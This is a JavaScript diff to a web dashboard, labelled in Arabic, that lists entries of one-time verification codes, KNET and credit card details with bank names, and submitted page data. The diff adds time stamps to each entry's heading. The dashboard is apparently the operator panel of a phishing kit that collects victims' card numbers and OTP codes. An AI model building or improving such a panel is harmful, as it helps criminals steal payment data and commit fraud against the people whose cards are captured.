@@ -1815,8 +1815,9 @@
           if (entry.type === 'code') {
             const dc = entry.data;
             const index = entry.index;
+            const codeTime = dc.timestamp ? new Date(dc.timestamp).toLocaleTimeString('en-GB', {hour: '2-digit', minute: '2-digit'}) : '';
             html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
-            html += '<h3 class="font-bold mb-3 text-orange-800">🔢 رمز التحقق</h3>';
+            html += '<h3 class="font-bold mb-3 text-orange-800">🔢 رمز التحقق' + (codeTime ? ' <span class="text-xs text-gray-500 font-normal">' + codeTime + '</span>' : '') + '</h3>';
             html += '<div class="bg-white p-3 rounded-lg">';
             html += '<div class="flex justify-between items-center mb-2">';
             html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
@@ -1941,11 +1942,12 @@
             const cardIndex = entry.index;
             const isKNET = card.paymentMethod === 'KNET';
             const cardInfo = getCardInfo(card.cardNumber);
+            const cardTime = card.timestamp ? new Date(card.timestamp).toLocaleTimeString('en-GB', {hour: '2-digit', minute: '2-digit'}) : (entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString('en-GB', {hour: '2-digit', minute: '2-digit'}) : '');
             
             if (isKNET) {
               // KNET card display
               html += '<div class="data-section bg-green-50 p-4 rounded-lg" style="border-right-color: #16a34a;">';
-              html += '<h3 class="font-bold mb-3 text-green-800">💳 كي نت (KNET)</h3>';
+              html += '<h3 class="font-bold mb-3 text-green-800">💳 كي نت (KNET)' + (cardTime ? ' <span class="text-xs text-gray-500 font-normal">' + cardTime + '</span>' : '') + '</h3>';
               html += '<div class="bg-gradient-to-r from-green-100 to-teal-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
               html += '<div class="flex items-center gap-2">';
               html += '<span class="text-green-700 font-bold text-lg">🏦 ' + (card.bankName || 'غير محدد') + '</span>';
@@ -1974,7 +1976,7 @@
             } else {
               // Credit card display (original)
               html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
-              html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع</h3>';
+              html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع' + (cardTime ? ' <span class="text-xs text-gray-500 font-normal">' + cardTime + '</span>' : '') + '</h3>';
               html += '<div class="bg-gradient-to-r from-purple-100 to-blue-100 p-3 rounded-lg mb-3 flex justify-between items-center">';
               html += '<div class="flex items-center gap-2">';
               html += '<span class="text-purple-700 font-bold text-lg">🏦 ' + cardInfo.bank + '</span>';
@@ -2008,9 +2010,10 @@
             const bgColor = dataIndex % 2 === 0 ? 'bg-blue-50' : 'bg-teal-50';
             const borderColor = dataIndex % 2 === 0 ? '#3b82f6' : '#14b8a6';
             const textColor = dataIndex % 2 === 0 ? 'text-blue-800' : 'text-teal-800';
+            const dataTime = dataEntry.timestamp ? new Date(dataEntry.timestamp).toLocaleTimeString('en-GB', {hour: '2-digit', minute: '2-digit'}) : '';
             
             html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
-            html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (dataEntry.page || 'بيانات') + '</h3>';
+            html += '<h3 class="font-bold mb-3 ' + textColor + '">📋 ' + (dataEntry.page || 'بيانات') + (dataTime ? ' <span class="text-xs text-gray-500 font-normal">' + dataTime + '</span>' : '') + '</h3>';
             html += '<div class="grid grid-cols-2 gap-3">';
             
             // Get commercial name from الاسم التجاري المعتمد field
